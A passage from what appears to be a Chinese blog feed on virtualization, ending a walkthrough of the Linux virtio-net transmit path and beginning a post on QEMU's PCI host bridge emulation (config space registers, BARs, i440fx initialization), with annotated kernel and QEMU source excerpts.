/home/hawk/Desktop/mqemu/kernel/arch/x86/kernel/apic/apic.c:1043</span></span><br><span class="line"><span class="type">static</span> <span class="type">netdev_tx_t</span> <span class="title function_">start_xmit</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb, <span class="keyword">struct</span> net_device *dev)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtnet_info</span> *<span class="title">vi</span> =</span> netdev_priv(dev);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">send_queue</span> *<span class="title">sq</span> =</span> &amp;vi-&gt;sq[qnum];</span><br><span class="line">    ...</span><br><span class="line"><span class="comment">/* Try to transmit */</span></span><br><span class="line">err = xmit_skb(sq, skb);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">xmit_skb</span><span class="params">(<span class="keyword">struct</span> send_queue *sq, <span class="keyword">struct</span> sk_buff *skb)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">return</span> virtqueue_add_outbuf(sq-&gt;vq, sq-&gt;sg, num_sg, skb, GFP_ATOMIC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">virtqueue_add_outbuf</span><span class="params">(<span class="keyword">struct</span> virtqueue *vq,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> scatterlist *sg, <span class="type">unsigned</span> <span class="type">int</span> num,</span></span><br><span class="line"><span class="params"> <span class="type">void</span> *data,</span></span><br><span class="line"><span class="params"> <span class="type">gfp_t</span> gfp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> virtqueue_add(vq, &amp;sg, num, <span class="number">1</span>, <span class="number">0</span>, data, <span class="literal">NULL</span>, gfp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">virtqueue_add</span><span class="params">(<span class="keyword">struct</span> virtqueue *_vq,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> scatterlist *sgs[],</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> total_sg,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> out_sgs,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> in_sgs,</span></span><br><span class="line"><span class="params"><span class="type">void</span> *data,</span></span><br><span class="line"><span class="params"><span class="type">void</span> *ctx,</span></span><br><span class="line"><span class="params"><span class="type">gfp_t</span> gfp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vring_virtqueue</span> *<span class="title">vq</span> =</span> to_vvq(_vq);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> vq-&gt;packed_ring ? virtqueue_add_packed(_vq, sgs, total_sg,</span><br><span class="line">out_sgs, in_sgs, data, ctx, gfp) :</span><br><span class="line"> virtqueue_add_split(_vq, sgs, total_sg,</span><br><span class="line">out_sgs, in_sgs, data, ctx, gfp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">virtqueue_add_split</span><span class="params">(<span class="keyword">struct</span> virtqueue *_vq,</span></span><br><span class="line"><span class="params">      <span class="keyword">struct</span> scatterlist *sgs[],</span></span><br><span class="line"><span class="params">      <span class="type">unsigned</span> <span class="type">int</span> total_sg,</span></span><br><span class="line"><span class="params">      <span class="type">unsigned</span> <span class="type">int</span> out_sgs,</span></span><br><span class="line"><span class="params">      <span class="type">unsigned</span> <span class="type">int</span> in_sgs,</span></span><br><span class="line"><span class="params">      <span class="type">void</span> *data,</span></span><br><span class="line"><span class="params">      <span class="type">void</span> *ctx,</span></span><br><span class="line"><span class="params">      <span class="type">gfp_t</span> gfp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="type">dma_addr_t</span> addr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (vring_map_one_sg(vq, sg, DMA_TO_DEVICE, &amp;addr))</span><br><span class="line"><span class="keyword">goto</span> unmap_release;</span><br><span class="line"></span><br><span class="line">prev = i;</span><br><span class="line"><span class="comment">/* Note that we trust indirect descriptor</span></span><br><span class="line"><span class="comment"> * table since it use stream DMA mapping.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">i = virtqueue_add_desc_split(_vq, desc, i, addr, sg-&gt;length,</span><br><span class="line">     VRING_DESC_F_NEXT,</span><br><span class="line">     indirect);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">virtqueue_add_desc_split</span><span class="params">(<span class="keyword">struct</span> virtqueue *vq,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> vring_desc *desc,</span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">int</span> i,</span></span><br><span class="line"><span class="params">    <span class="type">dma_addr_t</span> addr,</span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">int</span> len,</span></span><br><span class="line"><span class="params">    u16 flags,</span></span><br><span class="line"><span class="params">    <span class="type">bool</span> indirect)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vring_virtqueue</span> *<span class="title">vring</span> =</span> to_vvq(vq);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vring_desc_extra</span> *<span class="title">extra</span> =</span> vring-&gt;split.desc_extra;</span><br><span class="line">u16 next;</span><br><span class="line"></span><br><span class="line">desc[i].flags = cpu_to_virtio16(vq-&gt;vdev, flags);</span><br><span class="line">desc[i].addr = cpu_to_virtio64(vq-&gt;vdev, addr);</span><br><span class="line">desc[i].len = cpu_to_virtio32(vq-&gt;vdev, len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!indirect) &#123;</span><br><span class="line">next = extra[i].next;</span><br><span class="line">desc[i].next = cpu_to_virtio16(vq-&gt;vdev, next);</span><br><span class="line"></span><br><span class="line">extra[i].addr = addr;</span><br><span class="line">extra[i].len = len;</span><br><span class="line">extra[i].flags = flags;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">next = virtio16_to_cpu(vq-&gt;vdev, desc[i].next);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里<strong>virtqueue</strong>就是<a href="https://elixir.bootlin.com/linux/v6.9-rc2/source/drivers/net/virtio_net.c#L4624"><strong>virtnet_probe()</strong></a>逻辑中绑定的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">virtnet_find_vqs</span><span class="params">(<span class="keyword">struct</span> virtnet_info *vi)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">ret = virtio_find_vqs_ctx(vi-&gt;vdev, total_vqs, vqs, callbacks,</span><br><span class="line">  names, ctx, <span class="literal">NULL</span>);</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; vi-&gt;max_queue_pairs; i++) &#123;</span><br><span class="line">vi-&gt;rq[i].vq = vqs[rxq2vq(i)];</span><br><span class="line">vi-&gt;rq[i].min_buf_len = mergeable_min_buf_len(vi, vi-&gt;rq[i].vq);</span><br><span class="line">vi-&gt;sq[i].vq = vqs[txq2vq(i)];</span><br><span class="line">&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到，最后确实是通过<a href="https://elixir.bootlin.com/linux/v6.9-rc2/source/drivers/virtio/virtio_ring.c#L2197"><strong>virtqueue_add()</strong></a>向<strong>virtqueue</strong>内存处读写完成数据传输。</p><h3 id="数据通知-1"><a href="#数据通知-1" class="headerlink" title="数据通知"></a><del>数据通知</del></h3><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://blogs.oracle.com/linux/post/introduction-to-virtio">Introduction to VirtIO</a></li><li><a href="https://tinylab.org/virtio-intro/">半虚拟化技术 - VIRTIO 简介</a></li><li><a href="https://docs.oasis-open.org/virtio/virtio/v1.2/virtio-v1.2.html">Virtual I/O Device (VIRTIO) Version 1.2</a></li><li><a href="http://wiki.osdev.org/Virtio">Virtio</a></li><li><a href="https://www.redhat.com/en/blog/virtqueues-and-virtio-ring-how-data-travels">Virtqueues and virtio ring: How the data travels</a></li><li><a href="https://www.cnblogs.com/LoyenWang/p/14589296.html">【原创】Linux虚拟化KVM-Qemu分析（十一）之virtqueue</a></li><li><a href="https://www.openeuler.org/zh/blog/yorifang/virtio-spec-overview.html">Virtio协议概述</a></li><li><a href="https://blog.csdn.net/huang987246510/article/details/103379926">VirtIO实现原理——PCI基础</a></li><li><a href="https://www.cnblogs.com/haiyonghao/p/14440743.html">qemu-kvm的ioeventfd机制</a></li><li><a href="https://www.cnblogs.com/haiyonghao/p/14440723.html">qemu-kvm的irqfd机制</a></li><li><a href="https://www.bilibili.com/read/cv22112391/">深入分析Linux虚拟化KVM-Qemu之ioeventfd与irqfd</a></li><li><a href="https://www.cnblogs.com/haiyonghao/p/14440424.html">中断虚拟化-内核端(一)</a></li><li><a href="https://blog.csdn.net/home19900111/article/details/128610752">KVM IO虚拟化</a></li><li><a href="https://richardweiyang-2.gitbook.io/understanding_qemu/00-advance_interrupt_controller/02-qemu_kernel_emulate">Qemu/kernel混合模拟</a></li><li><a href="http://liujunming.top/pdf/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3MSI-X%E4%B8%AD%E6%96%AD%E5%92%8C%E4%B8%AD%E6%96%AD%E8%99%9A%E6%8B%9F%E5%8C%96.pdf">深入理解 MSI/MSI-X 中断和中断虚拟化</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 虚拟化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qemu </tag>
            
            <tag> 虚拟化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qemu的PCI设备</title>
      <link href="/2024/08/04/qemu%E7%9A%84PCI%E8%AE%BE%E5%A4%87/"/>
      <url>/2024/08/04/qemu%E7%9A%84PCI%E8%AE%BE%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>PCI(Peripheral Component Interconnect)是一种连接电脑主板和外部设备的总线标准，其从1992年提出之后就逐渐取代了其他各种总线，被各种处理器所支持，在x86硬件体系结构中几乎所有设备都以各种形式连接到PCI设备树上。因为，想要更好的了解Qemu设备模拟的细节就需要从PCI入手。</p><h1 id="PCI基础"><a href="#PCI基础" class="headerlink" title="PCI基础"></a>PCI基础</h1><h2 id="PCI总线结构"><a href="#PCI总线结构" class="headerlink" title="PCI总线结构"></a>PCI总线结构</h2><p>下图是一个经典的PCI总线架构图<br><img src="pci总线架构.png" alt="PCI总线架构图"></p><p>可以看到，PCI总线由三个基本组件构成</p><ul><li>PCI设备(PCI device)<br>  符合<a href="https://members.pcisig.com/wg/PCI-SIG/document/download/8237">PCI总线标准</a>(这里额外说明一下，PCI标准文档只允许PCI-SIG成员访问，可以尝试用公司邮箱登录访问)的设备就称为PCI设备，其能按照PCI总线标准进行交互。</li><li>PCI总线(PCI bus)<br>  用以连接多个PCI设备/PCI桥的通信干道</li><li>PCI桥(PCI bridge)<br>  总线之间的链接枢纽，可以连接CPU与PCI总线、PCI主总线与PCI次总线等</li></ul><h2 id="PCI设备编号"><a href="#PCI设备编号" class="headerlink" title="PCI设备编号"></a>PCI设备编号</h2><p>每个PCI设备在系统中的位置由总线编号(Bus Number)、设备编号(Device Number)和功能编号(Function Number)唯一确定</p><h2 id="PCI配置空间"><a href="#PCI配置空间" class="headerlink" title="PCI配置空间"></a>PCI配置空间</h2><p>每个PCI设备都有单独的存储空间，被称为PCI配置空间。</p><p>操作系统可以通过<strong>pio</strong>命令，通过访问<strong>CONFIG_ADDRESS(0xcf8)</strong>和<strong>CONFIG_DATA(0xcfc)</strong>寄存器来与PCI配置空间进行交互。这两个寄存器都是32bit，其中<strong>CONFIG_ADDRESS</strong>寄存器格式如下所示<br><img src="CONFIG_ADDRESS寄存器格式.png" alt="CONFIG_ADDRESS寄存器格式"></p><ul><li>bit31是<strong>CONFIG_DATA</strong>寄存器的使能位</li><li>bit30~24为保留位</li><li>bit23~16为总线编号</li><li>bit15~11为设备编号</li><li>bit10~8为功能编号</li><li>bit7~2为配置空间中32bit寄存器编号</li><li>bit1-0为只读0</li></ul><p>而<strong>CONFIG_DATA</strong>寄存器中的值是<strong>CONFIG_ADDRESS</strong>寄存器中指定配置空间内指定寄存器的数值。因此，操作系统与PCI设备配置空间的交互方式为</p><ul><li>向<strong>CONFIG_ADDRESS</strong>寄存器中写入要读/写的位置</li><li>从<strong>CONFIG_DATA</strong>寄存器中读/写数据</li></ul><p>PCI配置空间有多种格式，其中所有PCI设备的配置空间都有如下的Type 00格式头<br><img src="PCI设备配置空间头.png" alt="PCI设备配置空间头"></p><p>这里着重说明一下配置空间头的<strong>BAR(Base Address Register)</strong>寄存器，其用来定义该PCI设备占用的地址空间信息，格式如下所示<br><img src="BAR格式.png" alt="BAR格式"></p><p>操作系统与配置空间头的交互方式为</p><ul><li>操作系统向<strong>BAR</strong>写入<strong>所有bit都为1</strong>的值</li><li>操作系统读取<strong>BAR</strong>值，并将其翻转并加一，得到的即为该<strong>BAR</strong>所需要的地址空间大小</li><li>操作系统从对应地址空间中分配该大小的空间，并将空间地址写入<strong>BAR</strong>，完成<strong>BAR</strong>的设置</li></ul><h1 id="Qemu模拟"><a href="#Qemu模拟" class="headerlink" title="Qemu模拟"></a>Qemu模拟</h1><p>根据<a href="#PCI总线结构">PCI总线结构</a>中的介绍，一个经典的PCI总线包含PCI设备、PCI桥和PCI总线等三部分，则Qemu对这些部分都有相应的模拟。</p><h2 id="PCI桥"><a href="#PCI桥" class="headerlink" title="PCI桥"></a>PCI桥</h2><p>实际上，PCI桥也分多种类型，包括PCI-Host桥和PCI-PCI桥等。这里主要介绍PCI-Host桥，即连接CPU与PCI总线。</p><p>Qemu使用<strong>PCIHost</strong>对其进行模拟，其<strong>TypeInfo</strong>变量<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci/pci_host.c#L257"><strong>pci_host_type_info</strong></a>如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo pci_host_type_info = &#123;</span><br><span class="line">    .name = TYPE_PCI_HOST_BRIDGE,</span><br><span class="line">    .parent = TYPE_SYS_BUS_DEVICE,</span><br><span class="line">    .abstract = <span class="literal">true</span>,</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(PCIHostBridgeClass),</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(PCIHostState),</span><br><span class="line">    .class_init = pci_host_class_init,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>Qemu使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/hw/pci/pci_host.h#L53"><strong>struct PCIHostBridgeClass</strong></a>和<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/hw/pci/pci_host.h#L39"><strong>struct PCIHostState</strong></a>来表征<strong>PCIHost</strong></p><h4 id="struct-PCIHostBridgeClass"><a href="#struct-PCIHostBridgeClass" class="headerlink" title="struct PCIHostBridgeClass"></a>struct PCIHostBridgeClass</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIHostBridgeClass</span> &#123;</span></span><br><span class="line">    SysBusDeviceClass parent_class;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *(*root_bus_path)(PCIHostState *, PCIBus *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="struct-PCIHostState"><a href="#struct-PCIHostState" class="headerlink" title="struct PCIHostState"></a>struct PCIHostState</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIHostState</span> &#123;</span></span><br><span class="line">    SysBusDevice busdev;</span><br><span class="line"></span><br><span class="line">    MemoryRegion conf_mem;</span><br><span class="line">    MemoryRegion data_mem;</span><br><span class="line">    MemoryRegion mmcfg;</span><br><span class="line">    <span class="type">uint32_t</span> config_reg;</span><br><span class="line">    <span class="type">bool</span> mig_enabled;</span><br><span class="line">    PCIBus *bus;</span><br><span class="line">    <span class="type">bool</span> bypass_iommu;</span><br><span class="line"></span><br><span class="line">    QLIST_ENTRY(PCIHostState) next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中<strong>conf_mem</strong>字段是前面<a href="#PCI配置空间">PCI配置空间</a>中<strong>CONFIG_ADDRESS</strong>地址空间的<strong>MemoryRegion</strong>，<strong>config_reg</strong>是该地址空间的数据。<strong>data_mem</strong>字段是<strong>CONFIG_DATA</strong>地址空间的<strong>MemoryRegion</strong>，而该地址空间是<strong>CONFIG_ADDRESS</strong>指定的设备的配置空间寄存器，自然应当在指定PCI设备的数据结构中而不在这里存储。</p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>由于<strong>PCIHost</strong>仅仅是一个接口类，没有具体内容，这里用<strong>I440FX-PCIHost</strong>进行分析，其<strong>TypeInfo</strong>变量<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci-host/i440fx.c#L397"><strong>i440fx_pcihost_info</strong></a>如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo i440fx_pcihost_info = &#123;</span><br><span class="line">    .name          = TYPE_I440FX_PCI_HOST_BRIDGE,</span><br><span class="line">    .parent        = TYPE_PCI_HOST_BRIDGE,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(I440FXState),</span><br><span class="line">    .instance_init = i440fx_pcihost_initfn,</span><br><span class="line">    .class_init    = i440fx_pcihost_class_init,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h4 id="类初始化"><a href="#类初始化" class="headerlink" title="类初始化"></a>类初始化</h4><p>Qemu使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci-host/i440fx.c#L368"><strong>i440fx_pcihost_class_init()</strong></a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">i440fx_pcihost_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class="line">    PCIHostBridgeClass *hc = PCI_HOST_BRIDGE_CLASS(klass);</span><br><span class="line"></span><br><span class="line">    hc-&gt;root_bus_path = i440fx_pcihost_root_bus_path;</span><br><span class="line">    dc-&gt;realize = i440fx_pcihost_realize;</span><br><span class="line">    dc-&gt;fw_name = <span class="string">&quot;pci&quot;</span>;</span><br><span class="line">    device_class_set_props(dc, i440fx_props);</span><br><span class="line">    <span class="comment">/* Reason: needs to be wired up by pc_init1 */</span></span><br><span class="line">    dc-&gt;user_creatable = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    object_class_property_add(klass, PCI_HOST_PROP_PCI_HOLE_START, <span class="string">&quot;uint32&quot;</span>,</span><br><span class="line">                              i440fx_pcihost_get_pci_hole_start,</span><br><span class="line">                              <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    object_class_property_add(klass, PCI_HOST_PROP_PCI_HOLE_END, <span class="string">&quot;uint32&quot;</span>,</span><br><span class="line">                              i440fx_pcihost_get_pci_hole_end,</span><br><span class="line">                              <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    object_class_property_add(klass, PCI_HOST_PROP_PCI_HOLE64_START, <span class="string">&quot;uint64&quot;</span>,</span><br><span class="line">                              i440fx_pcihost_get_pci_hole64_start,</span><br><span class="line">                              <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    object_class_property_add(klass, PCI_HOST_PROP_PCI_HOLE64_END, <span class="string">&quot;uint64&quot;</span>,</span><br><span class="line">                              i440fx_pcihost_get_pci_hole64_end,</span><br><span class="line">                              <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其主要设置了<strong>realize</strong>函数指针为<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci-host/i440fx.c#L249"><strong>i440fx_pcihost_realize()</strong></a></p><h4 id="对象初始化"><a href="#对象初始化" class="headerlink" title="对象初始化"></a>对象初始化</h4><p>Qemu使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci-host/i440fx.c#L368"><strong>i440fx_pcihost_initfn()</strong></a>初始化对象<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">i440fx_pcihost_initfn</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    I440FXState *s = I440FX_PCI_HOST_BRIDGE(obj);</span><br><span class="line">    PCIHostState *phb = PCI_HOST_BRIDGE(obj);</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;phb-&gt;conf_mem, obj, &amp;pci_host_conf_le_ops, phb,</span><br><span class="line">                          <span class="string">&quot;pci-conf-idx&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    memory_region_init_io(&amp;phb-&gt;data_mem, obj, &amp;pci_host_data_le_ops, phb,</span><br><span class="line">                          <span class="string">&quot;pci-conf-data&quot;</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    object_property_add_link(obj, PCI_HOST_PROP_RAM_MEM, TYPE_MEMORY_REGION,</span><br><span class="line">                             (Object **) &amp;s-&gt;ram_memory,</span><br><span class="line">                             qdev_prop_allow_set_link_before_realize, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    object_property_add_link(obj, PCI_HOST_PROP_PCI_MEM, TYPE_MEMORY_REGION,</span><br><span class="line">                             (Object **) &amp;s-&gt;pci_address_space,</span><br><span class="line">                             qdev_prop_allow_set_link_before_realize, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    object_property_add_link(obj, PCI_HOST_PROP_SYSTEM_MEM, TYPE_MEMORY_REGION,</span><br><span class="line">                             (Object **) &amp;s-&gt;system_memory,</span><br><span class="line">                             qdev_prop_allow_set_link_before_realize, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    object_property_add_link(obj, PCI_HOST_PROP_IO_MEM, TYPE_MEMORY_REGION,</span><br><span class="line">                             (Object **) &amp;s-&gt;io_memory,</span><br><span class="line">                             qdev_prop_allow_set_link_before_realize, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到，其使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci/pci_host.c#L202"><strong>pci_host_conf_le_ops</strong></a>和<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci/pci_host.c#L214"><strong>pci_host_data_le_ops</strong></a>初始化了<strong>PCIHost</strong>的<strong>conf_mem</strong>字段和<strong>data_mem</strong>字段，这些回调函数的内容如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> MemoryRegionOps pci_host_conf_be_ops = &#123;</span><br><span class="line">    .read = pci_host_config_read,</span><br><span class="line">    .write = pci_host_config_write,</span><br><span class="line">    .endianness = DEVICE_BIG_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> MemoryRegionOps pci_host_data_le_ops = &#123;</span><br><span class="line">    .read = pci_host_data_read,</span><br><span class="line">    .write = pci_host_data_write,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_host_config_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr,</span></span><br><span class="line"><span class="params">                                  <span class="type">uint64_t</span> val, <span class="type">unsigned</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIHostState *s = opaque;</span><br><span class="line"></span><br><span class="line">    PCI_DPRINTF(<span class="string">&quot;%s addr &quot;</span> HWADDR_FMT_plx <span class="string">&quot; len %d val %&quot;</span>PRIx64<span class="string">&quot;\n&quot;</span>,</span><br><span class="line">                __func__, addr, len, val);</span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="number">0</span> || len != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    s-&gt;config_reg = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 